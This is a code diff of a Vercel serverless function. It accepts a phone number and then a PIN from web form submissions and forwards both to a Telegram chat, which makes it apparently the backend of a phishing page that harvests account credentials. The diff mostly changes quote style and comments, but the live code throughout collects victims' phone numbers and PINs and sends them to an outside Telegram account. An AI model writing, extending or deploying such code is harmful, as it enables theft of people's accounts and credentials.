@@ -21,18 +21,17 @@ async function sendTelegramMessage(message) {
 
     if (!response.ok) {
       const errorMessage = await response.text();
-      console.error("Telegram API error:", errorMessage);
+      console.error('Telegram API error:', errorMessage);
     }
   } catch (err) {
-    console.error("Failed to send message to Telegram:", err);
+    console.error('Failed to send message to Telegram:', err);
   }
 }
 
 // Vercel API Function (Serverless Function)
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    // Handle only POST requests
-    return res.status(405).json({ error: "Method Not Allowed" });
+    return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
   const { phoneNumber, pinCode } = req.body;
@@ -41,35 +40,37 @@ export default async function handler(req, res) {
     // Handle phone number submission
     if (phoneNumber && !pinCode) {
       if (clientData[phoneNumber]) {
-        return res.status(400).json({ error: "Phone number already submitted." });
+        return res.status(400).json({ error: 'Phone number already submitted.' });
       }
 
       clientData[phoneNumber] = { pin: null, state: 'waiting' };
       console.log(`Received phone number: ${phoneNumber}`);
       await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
-      return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
+      return res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
     }
 
     // Handle PIN code submission
     if (pinCode && !phoneNumber) {
+      // Find the last phone number waiting for a PIN
       const waitingPhoneNumber = Object.keys(clientData).find(
         (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
       );
 
       if (!waitingPhoneNumber) {
-        return res.status(400).json({ error: "No phone number waiting for a PIN." });
+        return res.status(400).json({ error: 'No phone number waiting for a PIN.' });
       }
 
       clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
       console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);
-      await sendTelegramMessage(`New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`);
-      return res.status(200).json({ status: "PIN code received and sent to Telegram." });
+      await sendTelegramMessage(
+        `New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`
+      );
+      return res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
     }
 
-    // If neither phoneNumber nor pinCode is valid
-    return res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
+    return res.status(400).json({ error: 'Invalid data. Expected either phoneNumber or pinCode.' });
   } catch (error) {
-    console.error("Error handling POST request:", error);
-    return res.status(500).json({ error: "Internal server error." });
+    console.error('Error handling POST request:', error);
+    return res.status(500).json({ error: 'Internal server error.' });
   }
 }
